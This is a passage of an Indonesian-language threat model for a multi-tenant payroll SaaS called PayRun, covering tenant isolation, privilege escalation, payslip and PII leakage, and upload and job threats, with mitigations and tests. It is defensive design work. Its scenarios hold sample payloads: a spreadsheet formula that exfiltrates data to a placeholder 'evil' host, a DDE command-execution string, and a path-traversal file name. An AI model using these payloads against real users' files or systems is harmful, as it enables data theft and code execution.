# PayRun Threat Model

> Bagian dari threat model. Format, skema ID (`T-PR-xx`), dan skala risiko mengikuti `00-index.md`.
> Threat generik (brute force login, JWT, XSS, CSRF, SQL injection, secrets, supply chain) ada di [`18-security-shared-threats.md`](18-security-shared-threats.md) sebagai `T-SH-xx` dan tidak diulang di sini. Kontrol `C-xx` dikatalogkan di [`20-security-controls.md`](20-security-controls.md).
> Walkthrough serangan "Company A → Employee Company B" (10 varian A1–A10) sudah ada di desain domain [`06-multi-tenancy.md`](06-multi-tenancy.md) §4. File ini merangkumnya sebagai satu threat (T-PR-01) dan menambahkan hal yang belum dicakup di sana.

---

## 1. Aset

| Aset | Di mana | Kenapa berharga | Dampak bila bocor / dimanipulasi |
|---|---|---|---|
| **Data gaji** (gaji pokok, komponen, riwayat effective-dated) | `salary_assignments`, `employee_components` | Data paling sensitif di perusahaan; dasar fraud penggajian | Konflik internal, sengketa, fraud (menaikkan gaji sendiri) |
| **Hasil payroll** (item, line, total run) | `payroll_runs`, `payroll_items`, `payroll_lines`, `payroll_item_snapshots` | Menentukan uang yang keluar | Pembayaran salah, fraud, hilangnya kepercayaan |
| **PII** (NIK, NPWP, nomor rekening) | `employees.*_enc` (AES-256-GCM), `nik_bidx` | Bisa dipakai untuk pencurian identitas dan penipuan | Pelanggaran UU PDP, kerugian pribadi karyawan |
| **Payslip PDF** | Object storage `tenants/{tenant_id}/payslips/…` | Berisi gaji + PII ter-mask | Kebocoran gaji per orang |
| **Konfigurasi tenant** | `tenant_settings`, `component_definitions` | Mengubah cara semua gaji dihitung | Manipulasi massal hasil payroll |
| **Membership & role** | `memberships`, `invitations` | Menentukan siapa boleh apa | Privilege escalation, pengambilalihan tenant |
| **Token undangan** | `invitations.token_hash` (secret hanya di URL) | Kunci masuk ke tenant | Orang asing menjadi anggota tenant |
| **Keyring enkripsi PII + key blind index** | Env/secret (V1), KMS (V2) | Membuka seluruh PII semua tenant | Kebocoran PII massal |
| **Audit log** | `audit_log` (append-only) | Bukti siapa melakukan apa | Repudiation; jejak fraud terhapus |
| **Bucket object storage** | MinIO/S3 private | Berisi PDF slip dan file import semua tenant | Kebocoran lintas tenant kalau kebijakan bucket salah |
| **Kredensial DB** (`payrun_owner`, `payrun_app`) | Secret CI/CD, env runtime | Owner bisa mematikan RLS | Isolasi tenant runtuh |

---

## 2. Trust boundary & data flow

```text
                 ┌───────────────────────── Internet ─────────────────────────┐
  Browser (Dewi, │  TB1: HTTPS + JWT (sub, tid, roles)                         │
  Hendra, Arif,  ├──────────────────▶ payrun api ─────────────────────────────┤
  Tono)          │                     │ TB2: WithTenantTx                     │
                 │                     │  set_config('app.tenant_id', tid)     │
  CSV upload ────┤ TB6: multipart      ▼                                       │
                 │               ┌───────────────┐                             │
                 │               │  PostgreSQL   │  RLS + FORCE, role non-owner│
                 │               │  (pooled)     │                             │
                 │               └──────▲────────┘                             │
                 │                      │ TB3: worker klaim jobs LINTAS tenant │
                 │                      │      lalu WithTenantTx(jobs.tenant_id)│
                 │               payrun worker                                 │
                 │                 │ TB4: S3 API (credential service)          │
                 │                 ▼                                           │
                 │           Object storage (private) ◀── presigned GET (TB4b) ── Browser
                 │                                                             │
  Platform operator ── TB5: akses infrastruktur/DB (tanpa backdoor aplikasi) ──┘
```

| Boundary | Dari → ke | Data yang melintas | Asumsi kepercayaan |
|---|---|---|---|
| TB1 | Browser → api | Kredensial, JWT, request bisnis, PII (ketika diinput) | Browser **tidak** dipercaya; setiap input divalidasi dan diotorisasi di server |
| TB2 | api → Postgres | Query dengan tenant context transaction-local | DB adalah penjaga terakhir (RLS); aplikasi bisa bug |
| TB3 | worker ↔ Postgres | Job lintas tenant, lalu data tenant | Kolom `jobs.tenant_id` dipercaya **hanya** karena ditulis di bawah trigger `jobs_enforce_tenant` |
| TB4 | api/worker → object storage | PDF slip, file import | Credential service hanya di server; bucket private, tanpa listing publik |
| TB4b | Browser → object storage | Download PDF via presigned URL | URL adalah *bearer token* sementara (5 menit) |
| TB5 | Operator → infrastruktur | Akses DB/server | V1: tidak ada jalur aplikasi lintas tenant untuk operator |
| TB6 | Browser → api (upload) | File CSV dari HR | Isi file **tidak** dipercaya: bisa rusak, raksasa, atau berbahaya |

---

## 3. STRIDE per boundary

| Boundary | S | T | R | I | D | E |
|---|---|---|---|---|---|---|
| TB1 | Token dicuri / undangan diteruskan (T-PR-04) | Manipulasi `tid`/role di token (T-PR-02) | Aksi admin tanpa jejak (T-PR-19) | IDOR slip/PII (T-PR-09, T-PR-10) | Flood endpoint berat (T-PR-17) | EMPLOYEE → HR (T-PR-03) |
| TB2 | — | Ubah data periode final (T-PR-08) | — | Cross-tenant (T-PR-01), RLS salah konfigurasi (T-PR-14) | Query mahal satu tenant (T-PR-17) | `SECURITY DEFINER` (T-PR-15) |
| TB3 | — | Tenant confusion di job (T-PR-13) | — | Job membaca data tenant lain (T-PR-13) | Satu tenant memenuhi antrean (T-PR-17) | — |
| TB4/4b | — | Ganti PDF di bucket (T-PR-09) | — | URL bocor / bucket publik (T-PR-09) | — | — |
| TB5 | Operator menyamar sebagai user | Edit DB langsung | Tanpa audit (T-PR-16) | Baca data tenant (T-PR-16) | — | Pakai role owner (T-PR-14) |
| TB6 | — | File memodifikasi data tenant lain (T-PR-11) | — | — | File raksasa / parser bomb (T-PR-11) | — |

---

## 4. Threats

### T-PR-01 — Akses data lintas tenant (baca/tulis)                [Inherent: Critical → Residual: Low]
```text
STRIDE        : I, T, E
Aset          : Semua data tenant (gaji, PII, payroll)
Threat        : User/proses tenant A membaca atau mengubah data tenant B.
Attack scenario: HR PT Alpha mencoba GET /employees/{id milik Beta}, memalsukan tid, menyelipkan tenant_id di
                 body, memakai ID Beta di resource bertingkat, memanipulasi filter list, atau memanfaatkan bug
                 developer yang lupa WHERE tenant_id. Detail 10 varian: `06-multi-tenancy.md` §4 (A1–A10).
Mitigation    : Berlapis (`06-multi-tenancy.md` layer diagram): tenant hanya dari claim tid ber-signature (`16-api-endpoints.md` §0) →
                 body tenant_id ditolak 400 → policy service + scope query → RLS USING/WITH CHECK + FORCE
                 (ADR-P01) → composite FK (tenant_id, x_id) (PI-02) → audit. Resource tenant lain = 404 identik
                 dengan resource tidak ada. C-RLS, C-AUTHZ, C-TENANT-CTX.
Detection     : Metrik tenant_isolation_violation_total (defensive check di service, harus 0);
                 lonjakan 404 per user (enumerasi) di log terstruktur.
Test          : Isolation test suite PF-04 (cross-tenant untuk setiap endpoint), RLS bypass test (query tanpa
                 filter), pool leakage test, authorization matrix kolom lintas tenant.
Status        : MVP. Residual: lihat `06-multi-tenancy.md` §5 (kredensial owner bocor, BYPASSRLS, SECURITY DEFINER,
                 bug jalur lintas tenant yang sah) → masing-masing dimitigasi di T-PR-14 dan T-PR-15.
```

### T-PR-02 — Penyalahgunaan tenant switching & membership basi     [Inherent: High → Residual: Low]
```text
STRIDE        : S, E
Aset          : Membership, data tenant
Threat        : (a) Memalsukan claim tid ke tenant yang bukan miliknya. (b) User yang membership-nya dicabut tetap
                 memakai access token lama. (c) Refresh dengan X-Active-Tenant ke tenant yang sudah dicabut.
Attack scenario: (a) Edit payload JWT, ganti tid. (b) Karyawan resign dicabut membership-nya jam 10:00, tetapi
                 memegang access token yang berlaku sampai 10:12, lalu mengunduh slip rekan kerja (kalau ia HR).
                 (c) Memanggil /auth/refresh dengan X-Active-Tenant: <tenant lama>.
Mitigation    : (a) Signature HS256 + kid (ADR-009); tid hanya diterbitkan oleh login/switch-tenant setelah
                 cek membership ACTIVE (ADR-P02). (b) Access token 15 menit; operasi sensitif (finalize,
                 lihat PII/slip orang lain, ubah gaji, ubah role) memeriksa ulang membership di DB (ADR-P02).
                 (c) Refresh memeriksa ulang membership; tenant dicabut → 200 dengan active_tenant: null
                 (`16-api-endpoints.md`), bukan token ber-tid.
Detection     : Audit membership.revoked + session.switch_tenant; log 401 signature invalid (pemalsuan).
Test          : Token dengan tid diubah → 401; membership dicabut → operasi sensitif 403/404 seketika,
                 refresh tidak lagi memberi tid.
Status        : MVP. Accepted risk: operasi non-sensitif (baca data dasar) masih mungkin dalam jendela
                 ≤ 15 menit setelah pencabutan. Alasan: trade-off performa (tanpa query membership per
                 request). V2: daftar revoke di Redis jika jendela ini tidak bisa diterima.
```

### T-PR-03 — Privilege escalation di dalam tenant                  [Inherent: High → Residual: Low]
```text
STRIDE        : E
Aset          : Membership & role, data gaji
Threat        : Role rendah memperoleh hak role lebih tinggi.
Attack scenario: (a) EMPLOYEE memanggil PATCH /members/{self}/roles {"roles":["HR_ADMIN"]}. (b) HR_ADMIN
                 memberi dirinya/orang lain OWNER atau PAYROLL_ADMIN. (c) MANAGER meng-approve cuti karyawan yang
                 bukan bawahannya, dengan menebak approval id. (d) HR_ADMIN menurunkan OWNER terakhir untuk
                 mengambil alih tenant. (e) PAYROLL_ADMIN mengubah gajinya sendiri lalu memproses run.
Mitigation    : Aturan pemberian role (siapa boleh memberi apa):
                   OWNER        → boleh memberi/mencabut semua role.
                   HR_ADMIN     → hanya MANAGER/EMPLOYEE, dan hanya pada member tanpa role admin.
                   lainnya      → tidak bisa mengubah role.
                 (`17-api-authorization-matrix.md` §2.1 ᴿ). Approve hanya oleh approver_id snapshot: UPDATE … WHERE approver_id = $actor
                 → 0 baris = 404 (ADR-P09). LAST_OWNER dijaga trigger deferred PI-16. SoD: PAYROLL_ADMIN tidak
                 punya hak tulis gaji (`17-api-authorization-matrix.md` §3.1). Perubahan role berlaku di token berikutnya, dan operasi
                 sensitif memeriksa ulang (T-PR-02).
Detection     : Audit membership.roles_changed (before/after), membership.sod_conflict;
                 403 berulang pada /members/* per user.
Test          : Authorization matrix (setiap kombinasi role × endpoint); test khusus: HR memberi OWNER → 403,
                 EMPLOYEE ubah role sendiri → 403, menghapus OWNER terakhir → 409 LAST_OWNER, manager non-atasan
                 approve → 404.
Status        : MVP.
```

### T-PR-04 — Serangan token undangan                               [Inherent: High → Residual: Low]
```text
STRIDE        : S, E
Aset          : Token undangan, membership
Threat        : Orang yang tidak diundang menjadi anggota tenant.
Attack scenario: (a) Brute force token. (b) Memakai ulang link yang sudah dipakai. (c) Link diteruskan (sengaja
                 atau tidak) ke orang lain, yang lalu menerimanya. (d) Link bocor di log/riwayat browser/referer.
                 (e) Mengganti bagian tenant_id di token ke tenant lain.
Mitigation    : Format <tenant_id>.<secret 32 byte base64url> (`12-db-schema.md` §2.3); hanya SHA-256(secret) yang
                 disimpan; sekali pakai (UPDATE … WHERE status='INVITED', ck_invitations_single_use);
                 berlaku 7 hari. **Accept mewajibkan user login dengan email = invited_email** (keputusan
                 threat model) sehingga link yang diteruskan tidak berguna bagi pemegang email lain. Semua kegagalan →
                 satu code 410 INVITATION_INVALID (tidak membedakan "salah token" vs "email tidak cocok").
                 Secret diletakkan di fragment URL (#…) agar tidak terkirim ke server lain lewat Referer atau
                 tercatat di access log. Lookup token dilakukan di bawah RLS tenant dari token, jadi mengganti
                 tenant_id membuat hash tidak ditemukan. Rate limit auth-ip.
Detection     : Lonjakan 410 per IP; audit membership.accepted (siapa, kapan, IP).
Test          : Token dipakai dua kali → 410; email beda → 410; tenant_id ditukar → 410; token kedaluwarsa → 410.
Status        : MVP. Accepted: tenant_id terlihat di link undangan. Penilaian: tenant_id adalah UUIDv7
                 tanpa nilai rahasia; mengetahuinya tidak memberi akses apa pun (T-PR-01). Imbalannya: lookup
                 di bawah RLS tanpa jalur platform tambahan.
```

### T-PR-05 — Bypass separation of duties pada payroll run          [Inherent: High → Residual: Medium]
```text
STRIDE        : E, R
Aset          : Hasil payroll, uang perusahaan
Threat        : Satu orang membuat sekaligus menyetujui run yang ia manipulasi.
Attack scenario: (a) PAYROLL_ADMIN submit run lalu approve sendiri. (b) Admin berpura-pura tenant hanya punya
                 satu admin untuk memakai pengecualian self-approval. (c) Satu orang diberi HR_ADMIN +
                 PAYROLL_ADMIN: menaikkan gajinya, lalu menjalankan dan menyetujui run.
Mitigation    : CHECK ck_approval_requests_not_self (approver ≠ requester kecuali self_approved +
                 PAYROLL_RUN + reason). Pengecualian satu admin hanya diizinkan jika memang hanya ada satu
                 membership admin aktif (dicek server saat submit, bukan pengakuan client), alasan wajib,
                 audit + metrik approval_self_approved_total (ADR-P09, `17-api-authorization-matrix.md` §3.1). Kombinasi
                 HR_ADMIN + PAYROLL_ADMIN diizinkan tetapi diaudit (membership.sod_conflict) dan
                 ditampilkan sebagai peringatan (amandemen ADR-010).
Detection     : Metrik approval_self_approved_total per tenant; audit sod_conflict; diff vs bulan lalu
                 (PF-23) menyoroti kenaikan > 20%.
Test          : Submitter approve run sendiri di tenant dengan 2 admin → 403 SELF_APPROVAL_FORBIDDEN;
                 tenant 1 admin tanpa reason → 422 SELF_APPROVAL_REASON_REQUIRED.
Status        : MVP. Residual Medium (disengaja): UMKM kecil memang tidak punya orang kedua. Risiko dibuat
                 terlihat, tidak dihilangkan. V2: opsi tenant "SoD keras" yang menolak kombinasi role.
```

### T-PR-06 — Bypass approval / finalize run yang tidak sah          [Inherent: High → Residual: Low]
```text
STRIDE        : T, E
Aset          : Hasil payroll
Threat        : Run difinalisasi tanpa approval, atau di-approve dengan data yang sudah berubah.
Attack scenario: (a) POST /payroll-runs/{id}/finalize saat run masih CALCULATED. (b) HR mengubah absensi
                 setelah kalkulasi, approver menyetujui angka lama yang sudah tidak cocok dengan data.
                 (c) Approve dan input edit terjadi bersamaan (race).
Mitigation    : Transisi state dengan guard UPDATE … WHERE status = 'APPROVED' (ADR-P05) → 409
                 INVALID_STATE_TRANSITION. Fingerprint guard saat approve → 409 RUN_STALE + employees_changed
                 (ADR-P07). Race: approve mengunci payroll_periods FOR UPDATE, penulis input lewat PeriodGuard
                 mengambil FOR SHARE (kontrak API O3).
Detection     : Audit payroll_run.* transitions; log 409 RUN_STALE.
Test          : Finalize dari CALCULATED → 409; ubah absensi setelah kalkulasi → approve 409 RUN_STALE;
                 concurrency test approve vs edit absensi.
Status        : MVP.
```

### T-PR-07 — Manipulasi gaji sebelum run (salary tampering)        [Inherent: High → Residual: Medium]
```text
STRIDE        : T, R
Aset          : Data gaji, hasil payroll
Threat        : Orang berwenang menaikkan gaji (diri sendiri/kolega) sesaat sebelum run, lalu mengembalikannya
                 setelah final agar tidak terlihat.
Attack scenario: HR_ADMIN membuat salary change +Rp3 juta berlaku 1 Maret, payroll Maret final, lalu membuat
                 record baru berlaku 1 April yang mengembalikan nilai lama.
Mitigation    : Effective dating tidak menimpa riwayat (ADR-P04), sehingga kedua perubahan tetap ada. Audit
                 salary.changed (actor, before/after) di transaksi yang sama. Snapshot input di item final
                 (ADR-P07) membekukan angka yang dipakai. Diff vs bulan lalu (PF-23) + warning anomali di halaman
                 review. SoD: approver run ≠ HR yang mengubah gaji (T-PR-05).
Detection     : Laporan audit "perubahan gaji dalam N hari sebelum cut-off" (P1 di halaman review);
                 warning diff > ambang.
Test          : Ubah gaji lalu kembalikan → kedua record ada di salary-history + audit; diff memunculkan flag.
Status        : MVP (audit, riwayat, diff). Residual Medium: insider dengan hak sah dan approver yang lalai
                 tetap bisa lolos. Itu masalah proses, bukan teknis; sistem menjamin jejaknya tidak bisa dihapus.
```

### T-PR-08 — Perubahan retroaktif pada periode final                [Inherent: High → Residual: Low]
```text
STRIDE        : T
Aset          : Konsistensi payroll final vs data sumber
Threat        : Mengubah absensi/cuti/gaji yang berlaku di periode FINALIZED sehingga slip tidak lagi bisa
                 dijelaskan dari data sumber, atau untuk menutupi sesuatu.
Attack scenario: PATCH /attendance/{id Maret} setelah Maret final; POST salary-changes dengan valid_from di
                 Februari; impor CSV berisi tanggal Maret.
Mitigation    : PeriodGuard di semua modul input → 409 PERIOD_LOCKED; trigger DB sebagai backstop yang
                 memeriksa rentang yang nilainya berubah (PI-14, `12-db-schema.md`). Trigger PI-04 + FOR SHARE
                 menolak perubahan item/line/snapshot run final. Koreksi hanya lewat adjustment (PF-19).
Detection     : Log 409 PERIOD_LOCKED per user; audit adjustment.created.
Test          : Setiap endpoint input dengan tanggal di periode final → 409; UPDATE langsung via SQL role app →
                 ditolak trigger.
Status        : MVP.
```

### T-PR-09 — Akses dan kebocoran payslip                           [Inherent: High → Residual: Low]
```text
STRIDE        : I, T
Aset          : Payslip (web & PDF), bucket
Threat        : Membaca slip orang lain, atau URL/objek PDF bocor.
Attack scenario: (a) Employee mengganti {id} di GET /me/payslips/{id} atau /payslips/{id}/download.
                 (b) Manager mencoba melihat slip bawahan. (c) Presigned URL dibagikan lewat chat atau
                 tersimpan di riwayat proxy. (d) Penyerang menebak object key
                 tenants/{tenant}/payslips/{run}/{employee}.pdf. (e) Bucket salah dikonfigurasi menjadi
                 publik/listable. (f) Penyerang yang punya credential storage menimpa PDF.
Mitigation    : Endpoint self memakai predikat employee_id = $self (id request hanya kunci pencarian di dalam
                 scope); non-pemilik → 404; HR/PAYROLL akses ter-audit per slip (PI-17); list slip/item yang memuat nominal gaji orang lain menulis satu audit `payroll.bulk_read` per request + recheck membership (final review R2-6). Manager tidak punya
                 hak lihat gaji (`17-api-authorization-matrix.md` §3.4). Presigned GET TTL 5 menit, dibuat setelah otorisasi + audit,
                 tidak pernah di-log atau di-cache; Content-Disposition: attachment. Object key bisa ditebak,
                 tetapi tanpa signature valid tetap ditolak; bucket private, tanpa listing, block public access
                 (ADR-012). Credential storage hanya di server, hak minimum (put/get pada prefix aplikasi).
Detection     : Audit payslip.viewed / payslip.downloaded (non-pemilik); 404 berulang per user;
                 alert konfigurasi bucket (V2).
Test          : Employee akses slip orang lain → 404; manager → 404/403 sesuai matriks; URL kedaluwarsa
                 setelah 5 menit → 403 dari storage; request tanpa signature → 403.
Status        : MVP (web), P1 (PDF). Accepted: URL yang bocor berlaku ≤ 5 menit.
```

### T-PR-10 — Kebocoran PII                                          [Inherent: High → Residual: Low]
```text
STRIDE        : I
Aset          : NIK, NPWP, nomor rekening; keyring
Threat        : PII terbaca oleh pihak yang tidak berwenang lewat API, log, export, backup, atau
                 ciphertext swapping.
Attack scenario: (a) PAYROLL_ADMIN/MANAGER memanggil GET /employees/{id}/pii. (b) PII muncul di log error,
                 pesan validasi, atau audit diff. (c) Dump DB/backup bocor. (d) Penyerang dengan akses tulis
                 DB menyalin ciphertext NIK dari tenant A ke baris tenant B untuk didekripsi lewat API tenant B.
                 (e) Enumerasi NIK lewat pesan 409 NIK_TAKEN.
Mitigation    : Default API = masked (****1234); PII penuh hanya lewat W6 untuk O/H/self, dengan rate limit
                 khusus 30/jam per user, dan audit employee.pii_viewed ditulis di transaksi yang sama (audit
                 gagal → 503, bukan PII tanpa jejak). Enkripsi aplikasi AES-256-GCM dengan AAD =
                 tenant_id:table.column sehingga ciphertext yang dipindah gagal didekripsi (ADR-P08). Blind
                 index HMAC dengan key terpisah. Redaction di logger (allowlist field, `18-security-shared-threats.md`) dan audit diff
                 tanpa nilai PII mentah (PF-16). NIK_TAKEN hanya di dalam tenant sendiri dan tidak menyebut
                 pemiliknya.
Detection     : Audit pii_viewed + metrik per user; test log redaction di CI; alert rate limit W6.
Test          : P/M → 403 di W6; dekripsi ciphertext yang disalin ke tenant lain → gagal; log setelah error
                 validasi tidak memuat NIK (grep test); audit tercatat untuk setiap akses PII.
Status        : P1 (PF-20). Residual: aplikasi yang sudah diretas tetap bisa mendekripsi (keyring di memori).
                 V2: KMS envelope per tenant + IAM terpisah.
```

### T-PR-11 — Upload CSV berbahaya (import absensi)                  [Inherent: Medium → Residual: Low]
```text
STRIDE        : D, T
Aset          : Worker, data absensi
Threat        : File upload dipakai untuk DoS, menulis data tenant lain, atau menyelundupkan konten berbahaya.
Attack scenario: (a) File 5 GB atau CSV dengan 10 juta baris / satu baris 100 MB. (b) File bukan CSV (EXE,
                 ZIP, HTML) dengan nama .csv. (c) CSV berisi employee_no milik tenant lain. (d) Encoding aneh /
                 BOM / karakter kontrol untuk merusak parser. (e) Nama file berisi path traversal
                 (../../etc/passwd) atau script untuk XSS di halaman hasil import.
Mitigation    : Batas 5 MB di HTTP layer (413) + batas baris (mis. 50.000) dan panjang field di parser
                 streaming; sniffing konten (harus teks UTF-8, header persis sesuai template) bukan percaya
                 Content-Type; hanya di-parse sebagai CSV, tidak pernah dieksekusi atau dirender. File disimpan
                 di bucket private dengan key acak (tenants/{tenant}/imports/{import_id}), nama asli hanya
                 disimpan sebagai metadata dan di-escape saat ditampilkan. Worker memakai tenant dari
                 jobs.tenant_id, bukan dari isi file; employee_no dicari di bawah RLS → baris tenant lain =
                 "employee tidak ditemukan". Idempoten via hash file (409 IMPORT_DUPLICATE). Rate limit heavy
                 (10 import/jam per tenant).
Detection     : Metrik import gagal + durasi; log 413/400 upload.
Test          : File 6 MB → 413; file biner → 400; CSV dengan employee_no tenant lain → error per baris, tidak
                 ada baris tertulis untuk tenant lain; nama file berisi <script> → ter-escape.
Status        : P1 (PF-21). Production enhancement: pemindaian malware (ClamAV/layanan storage) sebelum diproses.
                 Zip bomb N/A (hanya CSV teks, tanpa dekompresi).
```

### T-PR-12 — CSV / formula injection pada export                    [Inherent: Medium → Residual: Low]
```text
STRIDE        : T (pada komputer pengguna)
Aset          : Komputer HR/finance yang membuka export di Excel
Threat        : Nilai yang dikontrol pengguna (nama karyawan, catatan cuti, alasan adjustment) masuk ke file CSV
                 dan dieksekusi sebagai formula oleh spreadsheet.
Attack scenario: Karyawan mengisi nama =HYPERLINK("http://evil/?d="&A1,"klik") atau
                 =cmd|'/c calc'!A0; HR mengekspor file transfer bank / laporan lalu membukanya di Excel.
Mitigation    : Encoder CSV pusat (satu fungsi untuk semua export): sel yang diawali = + - @ tab CR diberi
                 prefix ' dan di-quote; tidak ada export yang menulis CSV tanpa encoder ini (lint/test).
                 Validasi input nama menolak karakter kontrol.
Detection     : —
Test          : Unit test encoder dengan payload formula umum; golden test file export.
Status        : P2 (PF-25 export bank) / P3 (laporan). Encoder dibuat bersamaan dengan export pertama.
```

### T-PR-13 — Tenant confusion / tampering payload job              [Inherent: High → Residual: Low]
```text
STRIDE        : T, I
Aset          : Data tenant yang diproses worker
Threat        : Job memproses data tenant yang salah karena payload dimanipulasi atau tenant ikut di payload.
Attack scenario: (a) Request tenant A meng-enqueue job dengan tenant_id = B. (b) Bug memasukkan run_id milik
                 Beta ke payload job Alpha. (c) Worker membaca tenant dari payload JSON, bukan dari kolom.
Mitigation    : Tabel jobs tidak di bawah RLS (worker mengklaim lintas tenant), tetapi trigger
                 jobs_enforce_tenant menolak INSERT dengan tenant_id ≠ app.tenant_id transaksi, dan job
                 bertenant di luar tenant transaction (`10-db-shared-tables.md`). Handler hanya memakai kolom jobs.tenant_id
                 untuk WithTenantTxFor; tenant di payload diabaikan. Semua data dibaca di bawah RLS, sehingga
                 run_id Beta di job Alpha = 0 baris → job gagal aman (desain domain PFS-09). Fencing CompleteInTx
                 (ADR-006).
Detection     : Log job gagal "resource not found in tenant"; metrik job_dead_total.
Test          : Enqueue job tenant B dari transaksi tenant A → ditolak trigger; job dengan run_id tenant lain
                 → tidak ada efek.
Status        : MVP.
```

### T-PR-14 — RLS salah konfigurasi                                  [Inherent: Critical → Residual: Low]
```text
STRIDE        : I, E
Aset          : Isolasi tenant secara keseluruhan
Threat        : RLS terlihat aktif padahal tidak berlaku.
Attack scenario: (a) Migrasi baru membuat tabel ber-tenant_id tanpa ENABLE/FORCE RLS atau tanpa policy.
                 (b) App terhubung sebagai payrun_owner (owner tabel melewati RLS tanpa FORCE). (c) Role app
                 diberi BYPASSRLS. (d) View baru dibuat tanpa security_invoker. (e) Fungsi SECURITY DEFINER
                 baru ditambahkan.
Mitigation    : Test katalog di CI (`13-db-rls-consistency-indexing.md` §2): setiap tabel ber-tenant_id wajib relrowsecurity +
                 relforcerowsecurity + policy; tidak ada SECURITY DEFINER di luar allowlist
                 (auth_lookup_user); view wajib security_invoker. Readiness check saat startup: api/worker
                 menolak start jika role koneksi adalah owner atau punya BYPASSRLS. Kredensial owner hanya di
                 job migrasi CI/CD.
Detection     : Readiness gagal (deploy berhenti); CI merah.
Test          : Test katalog + test negatif (migrasi contoh tanpa RLS membuat CI gagal); startup dengan role
                 owner → proses keluar.
Status        : MVP.
```

### T-PR-15 — Penyalahgunaan fungsi SECURITY DEFINER login           [Inherent: Medium → Residual: Low]
```text
STRIDE        : I, E
Aset          : Tabel users (lintas tenant)
Threat        : Fungsi payrun.auth_lookup_user dipakai untuk membaca data user di luar alur login, atau dibajak
                 lewat search_path.
Attack scenario: (a) Bug/injection memanggil fungsi untuk mengenumerasi email. (b) Penyerang membuat objek
                 bernama sama di schema lain agar fungsi memakai objek tersebut.
Mitigation    : Fungsi hanya mengembalikan satu baris untuk email persis (id, password_hash, status, counter
                 lock); SET search_path = payrun, pg_temp; EXECUTE hanya untuk payrun_app; hanya dipanggil
                 dari handler login, yang di-rate-limit auth-strict (T-SH brute force). Respons login tidak
                 membedakan email tidak ada vs password salah. Fungsi baru SECURITY DEFINER wajib review
                 (CI allowlist, T-PR-14).
Detection     : Lonjakan login gagal per IP (T-SH).
Test          : Test katalog allowlist; test bahwa respons login identik untuk email tidak terdaftar.
Status        : MVP.
```

### T-PR-16 — Akses platform operator / support                      [Inherent: High → Residual: Medium]
```text
STRIDE        : I, R, E
Aset          : Data semua tenant
Threat        : Tim penyedia SaaS membaca/mengubah data tenant tanpa sepengetahuan dan tanpa jejak.
Attack scenario: Support diminta membantu tenant, lalu memakai akses DB langsung atau akun admin tersembunyi
                 untuk melihat gaji.
Mitigation    : V1: **tidak ada backdoor aplikasi** (tidak ada role "superadmin" lintas tenant di API).
                 Akses infrastruktur dibatasi ke pemilik project, dan kredensial owner hanya di CI/CD. Support
                 dilakukan dengan tenant mengundang support sebagai member (terlihat oleh tenant, bisa
                 dicabut, ter-audit). Break-glass (P2, PF-28): permintaan beralasan, time-boxed (mis. 1 jam),
                 hanya baca, tenant diberi notifikasi, setiap akses tercatat di audit_log tenant tersebut.
Detection     : Audit akses break-glass (P2); log akses DB (V2: pgaudit).
Test          : Tidak ada endpoint lintas tenant selain jalur platform yang terdaftar (test inventaris rute).
Status        : MVP (tanpa backdoor). Residual Medium: operator dengan akses DB/infra tetap bisa membaca
                 data non-terenkripsi. Mitigasi V2: pgaudit, pemisahan akses produksi, KMS untuk PII.
```

### T-PR-17 — Noisy neighbor / DoS oleh satu tenant                  [Inherent: Medium → Residual: Medium]
```text
STRIDE        : D
Aset          : Ketersediaan untuk semua tenant
Threat        : Satu tenant (sengaja atau tidak) menghabiskan worker, koneksi DB, atau CPU sehingga tenant lain
                 terlambat menggaji.
Attack scenario: Tenant memicu calculate berulang untuk 10.000 karyawan, mengimpor file besar terus-menerus,
                 atau me-list audit log dengan rentang maksimum berulang-ulang.
Mitigation    : Rate limit tier heavy per tenant (calculate 10/jam, import 10/jam, finalize 5/jam); chunking
                 job (ADR-P05); statement_timeout; cursor pagination dengan limit maksimum 100 dan rentang
                 ≤ 366 hari. P2: batas konkurensi job per tenant di worker (PF-27).
Detection     : Metrik job_queue_depth + umur job tertua; durasi run per tenant tier.
Test          : Load test dua tenant (besar + kecil): run tenant kecil tetap selesai dalam batas waktu (desain DevOps).
Status        : MVP (rate limit, chunking). Residual Medium sampai fairness per tenant (P2) dibangun.
```

### T-PR-18 — Enumerasi informasi                                    [Inherent: Low → Residual: Low]
```text
STRIDE        : I
Aset          : Keberadaan tenant/user/karyawan
Threat        : Pesan error membocorkan keberadaan data.
Attack scenario: (a) Cek ketersediaan slug saat signup untuk menebak nama perusahaan pelanggan. (b) 409
                 EMPLOYEE_NO_TAKEN / NIK_TAKEN untuk menebak data. (c) Membandingkan waktu respons 404 untuk
                 ID tenant lain vs ID acak. (d) Timing blind index.
Mitigation    : NIK_TAKEN/EMPLOYEE_NO_TAKEN hanya dievaluasi di dalam tenant sendiri (RLS + unique per tenant)
                 dan tanpa menyebut pemilik. Jalur 404 identik (`06-multi-tenancy.md` §5). Blind index dibandingkan oleh DB
                 lewat unique index, bukan oleh kode aplikasi.
Detection     : Lonjakan 409/404 per user.
Test          : Respons 404 ID tenant lain == ID acak (status, body).
Status        : MVP. Accepted: slug tenant yang sudah dipakai terungkap saat signup (409 DUPLICATE_CODE).
                 Nilai informasinya rendah (slug bukan rahasia; tampil di URL undangan/UI) dan dibatasi
                 rate limit auth-ip.
```

### T-PR-19 — Repudiation & integritas audit log                     [Inherent: Medium → Residual: Low]
```text
STRIDE        : R, I
Aset          : Audit log
Threat        : Pelaku menyangkal aksi, menghapus jejak, atau membaca audit tenant lain.
Attack scenario: HR menghapus/mengubah baris audit setelah mengubah gaji; HR tenant A mem-filter audit_log
                 untuk melihat aktivitas tenant B.
Mitigation    : audit_log append-only (trigger forbid_update_delete + grant SELECT/INSERT, `10-db-shared-tables.md`);
                 ditulis di transaksi yang sama dengan perubahan; RLS tenant pada audit_log; GET /audit-log
                 hanya untuk O/H. Aksi dicatat dengan request_id + IP + user agent.
Detection     : Error 42501 (percobaan UPDATE/DELETE) di log → alert.
Test          : UPDATE/DELETE audit_log dengan role app → 409 IMMUTABLE_RECORD; HR Alpha tidak melihat
                 audit Beta.
Status        : MVP. V2: ekspor audit ke penyimpanan WORM / log terpusat agar tahan terhadap kompromi DB.
```

### T-PR-20 — Permintaan penghapusan data / offboarding tenant      [Inherent: Medium → Residual: Medium]
```text
STRIDE        : I (kepatuhan)
Aset          : PII karyawan yang sudah keluar, data tenant yang berhenti berlangganan
Threat        : Data pribadi disimpan lebih lama dari yang diizinkan, atau penghapusan merusak integritas payroll
                 historis.
Attack scenario: Mantan karyawan meminta datanya dihapus (hak subjek data UU PDP); tenant berhenti dan meminta
                 seluruh datanya dihapus.
